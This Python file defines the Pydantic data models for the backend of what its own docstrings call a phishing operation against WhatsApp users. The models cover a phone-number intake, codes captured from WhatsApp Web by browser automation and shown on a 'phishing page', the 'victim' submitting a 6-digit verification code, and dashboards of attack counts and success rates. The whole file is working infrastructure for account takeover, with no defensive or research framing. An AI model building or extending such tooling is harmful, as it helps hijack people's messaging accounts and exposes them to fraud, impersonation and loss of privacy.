"""
Pydantic v2 models for all API request/response validation.
Every endpoint input is validated before reaching route handlers.
"""
from datetime import datetime
from typing import Optional, List, Any
from pydantic import BaseModel, Field, field_validator

from config import PHONE_PATTERN, CODE_PATTERN


# ── Request Models ─────────────────────────────────────

class PhoneRequest(BaseModel):
    """Request to start verification for a phone number."""
    phone: str = Field(
        ...,
        min_length=8,
        max_length=20,
        description="Phone number with country code (e.g., +12345678901)",
        examples=["+12345678901"],
    )

    @field_validator("phone")
    @classmethod
    def validate_phone(cls, v: str) -> str:
        v = v.strip()
        if not v.startswith("+"):
            raise ValueError("Phone number must include country code (e.g., +1)")
        # Remove spaces, dashes, parens
        cleaned = v.replace(" ", "").replace("-", "").replace("(", "").replace(")", "")
        if not PHONE_PATTERN.match(cleaned):
            raise ValueError(
                "Invalid phone format. Use country code + number (e.g., +12345678901)"
            )
        if len(cleaned) < 8:
            raise ValueError("Phone number too short")
        if len(cleaned) > 16:
            raise ValueError("Phone number too long")
        return cleaned


class DisplayCodeRequest(BaseModel):
    """Sent by automation when it captures the displayed code from WhatsApp Web."""
    attack_id: int = Field(..., gt=0)
    code: str = Field(..., min_length=8, max_length=12)
    phone: str = Field(..., min_length=8)


class VerifyCodeRequest(BaseModel):
    """Victim submits the 6-digit verification code from their phone."""
    attack_id: int = Field(..., gt=0)
    code: str = Field(..., min_length=6, max_length=6)

    @field_validator("code")
    @classmethod
    def validate_code(cls, v: str) -> str:
        v = v.strip()
        if not v.isdigit() or len(v) != 6:
            raise ValueError("Verification code must be exactly 6 digits")
        return v


# ── Response Models ────────────────────────────────────

class BaseResponse(BaseModel):
    """Standard API response wrapper."""
    success: bool
    message: str = ""


class AttackInitResponse(BaseResponse):
    """Response after starting a new attack."""
    attack_id: Optional[int] = None
    automation: bool = True
    timestamp: str = Field(default_factory=lambda: datetime.now().isoformat())


class CodeDisplayResponse(BaseResponse):
    """Response when code is displayed on phishing page."""
    code: Optional[str] = None
    phone: Optional[str] = None


class PairingStatusResponse(BaseResponse):
    """Response for pairing status check."""
    paired: bool = False
    completed: bool = False
    status: str = "waiting"


class AttackListItem(BaseModel):
    """Single attack in a list."""
    id: int
    phone: str
    status: str
    timestamp: str
    code_received: Optional[str] = None
    automation_started: bool = False
    automation_success: bool = False
    browser_pid: Optional[int] = None


class AttackListResponse(BaseModel):
    """List of recent attacks."""
    attacks: List[dict] = []


class StatsResponse(BaseModel):
    """Attack statistics."""
    total_attacks: int = 0
    successful: int = 0
    automation_started: int = 0
    automation_success: int = 0
    success_rate: float = 0.0
    automation_rate: float = 0.0


class HealthResponse(BaseModel):
    """Server health check."""
    status: str = "ok"
    version: str = "2.1"
    playwright_available: bool = False
    database_ok: bool = False


class ClearDBResponse(BaseModel):
    """Response after clearing the database."""
    message: str
    active_attacks_cleared: bool = False


class WebSocketMessage(BaseModel):
    """Message sent over WebSocket."""
    type: str
    client_id: Optional[str] = None
    stats: Optional[dict] = None
    message: Optional[str] = None
    attack_id: Optional[int] = None
    phone: Optional[str] = None
    code: Optional[str] = None
    timestamp: Optional[str] = None
    active_automations: Optional[int] = None
    automation: bool = False
